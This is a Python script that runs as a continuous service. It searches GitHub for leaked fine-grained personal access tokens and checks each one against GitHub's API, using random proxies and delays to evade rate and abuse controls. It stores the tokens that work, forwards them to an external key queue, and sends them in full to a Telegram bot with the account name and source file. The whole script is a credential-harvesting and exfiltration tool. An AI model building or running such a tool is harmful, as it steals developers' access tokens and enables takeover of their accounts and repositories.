import os
import random
import re
import sys
import time
import threading
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Any
from http.server import BaseHTTPRequestHandler, HTTPServer

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# --- 状态与汇总变量 ---
LAST_TG_SEND_TIME = time.time()
PENDING_TOKENS_TO_SEND = []

# 创建GitHub工具实例
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# --- 健康检查 Web 服务类 (适配 Koyeb) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return  # 禁用日志记录

def start_health_check_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    logger.info(f"👻 Health check server started on port {port}")
    server.serve_forever()

# --- Telegram 汇总发送函数 ---
def send_telegram_summary():
    global LAST_TG_SEND_TIME, PENDING_TOKENS_TO_SEND
    token = os.getenv("TG_BOT_TOKEN")
    chat_id = os.getenv("TG_CHAT_ID")
    
    if not token or not chat_id or not PENDING_TOKENS_TO_SEND:
        PENDING_TOKENS_TO_SEND = []
        LAST_TG_SEND_TIME = time.time()
        return

    header = f"📊 【GitHub PAT 专项扫描汇总】\n"
    header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
    header += f"✨ 新发现有效 Token: {len(PENDING_TOKENS_TO_SEND)} 个\n\n"
    
    all_keys_text = "\n".join(PENDING_TOKENS_TO_SEND)
    full_message = header + all_keys_text
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    try:
        # 分段处理长消息
        MAX_LENGTH = 3500 
        if len(full_message) <= MAX_LENGTH:
            requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
        else:
            parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
            for index, part in enumerate(parts):
                msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
                requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
                time.sleep(1) 
        logger.info(f"📤 已向 Telegram 发送汇总报告")
    except Exception as e:
        logger.error(f"❌ Telegram 发送失败: {e}")
    
    PENDING_TOKENS_TO_SEND = []
    LAST_TG_SEND_TIME = time.time()

# --- GitHub PAT 验证函数 ---
def validate_github_token(token: str) -> str:
    """验证 GitHub Token 的有效性"""
    try:
        # 使用 Config 中预设的验证地址：https://api.github.com/user
        url = Config.GITHUB_API_URL
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # 随机延迟避免被风控
        time.sleep(random.uniform(0.5, 1.5))
        proxies = Config.get_random_proxy()
        
        response = requests.get(url, headers=headers, proxies=proxies, timeout=15)

        if response.status_code == 200:
            user_info = response.json()
            user_login = user_info.get("login", "Unknown")
            return f"ok_user_{user_login}"
        elif response.status_code == 401:
            return "unauthorized"
        elif response.status_code == 403:
            return "forbidden_or_rate_limited"
        else:
            return f"error_{response.status_code}"
    except Exception as e:
        return f"exception_{type(e).__name__}"

def process_item(item: Dict[str, Any]) -> tuple:
    """处理 GitHub 搜索结果项"""
    file_url = item["html_url"]
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]

    content = github_utils.get_file_content(item)
    if not content:
        return 0, 0

    # 提取 Fine-grained PAT ( github_pat_ 开头的 82 位字符 )
    tokens = re.findall(r'(github_pat_[a-zA-Z0-9]{82})', content)
    unique_tokens = list(set(tokens))
    
    if not unique_tokens:
        return 0, 0

    valid_count = 0
    for tk in unique_tokens:
        logger.info(f"🔑 Found potential PAT: {tk[:15]}..., validating...")
        result = validate_github_token(tk)
        
        if result.startswith("ok"):
            valid_count += 1
            logger.info(f"✅ VALID PAT: {tk[:15]}... ({result})")
            # 保存到本地文件
            file_manager.save_valid_keys(repo_name, file_path, file_url, [tk])
            # 添加到 TG 发送列表
            PENDING_TOKENS_TO_SEND.append(f"TOKEN: {tk}\nUSER: {result.replace('ok_user_', '')}\nFROM: {file_url}\n")
            # 同步到外部负载均衡器 (复用原来的 GROK 通道)
            try:
                sync_utils.add_keys_to_queue([tk])
            except: pass
        else:
            logger.info(f"❌ INVALID PAT: {tk[:15]}... (Result: {result})")

    return valid_count, 0

def main():
    # 启动健康检查服务
    threading.Thread(target=start_health_check_server, daemon=True).start()
    
    logger.info("=" * 60)
    logger.info("🚀 GITHUB PAT DEEP SCANNER STARTING")
    logger.info("=" * 60)

    if not Config.check() or not file_manager.check():
        sys.exit(1)

    search_queries = file_manager.get_search_queries()
    loop_count = 0

    while True:
        try:
            loop_count += 1
            logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            # 重置本轮扫描状态
            checkpoint.processed_queries = set()

            for q in search_queries:
                # === 深度扫描逻辑：时间切片分段扫描 ===
                end_dt = datetime.now()
                # 按照 Config 中的回溯天数计算起点
                start_dt = end_dt - timedelta(days=Config.DATE_RANGE_DAYS)
                
                curr_end = end_dt
                while curr_end > start_dt:
                    # 步长由 Config.DEEP_SCAN_INTERVAL_DAYS 控制
                    curr_start = curr_end - timedelta(days=Config.DEEP_SCAN_INTERVAL_DAYS)
                    date_filter = f"created:{curr_start.strftime('%Y-%m-%d')}..{curr_end.strftime('%Y-%m-%d')}"
                    
                    # 组合最终的强力扫描指令 (Keyword + Global Exclude + Date Filter)
                    full_q = f"{q} {Config.GLOBAL_EXCLUDE_DORK} {date_filter}"
                    
                    logger.info(f"🔍 [Scanning] {full_q}")
                    res = github_utils.search_for_keys(full_q)
                    
                    if res and "items" in res:
                        items = res["items"]
                        for item in items:
                            # SHA 去重过滤
                            if item.get("sha") in checkpoint.scanned_shas:
                                continue
                            
                            process_item(item)
                            checkpoint.add_scanned_sha(item.get("sha"))
                            
                            # 每处理一页保存一次进度
                            file_manager.save_checkpoint(checkpoint)

                    curr_end = curr_start
                    time.sleep(2) # 礼貌延迟

                # 每一条主 query 处理完后，检查是否需要发送 TG 汇总
                if time.time() - LAST_TG_SEND_TIME >= 3600:
                    send_telegram_summary()

            logger.info(f"🏁 Loop #{loop_count} complete. Sleeping...")
            time.sleep(60)

        except Exception as e:
            logger.error(f"💥 Runtime Error: {e}")
            traceback.print_exc()
            time.sleep(30)

if __name__ == "__main__":
    main()
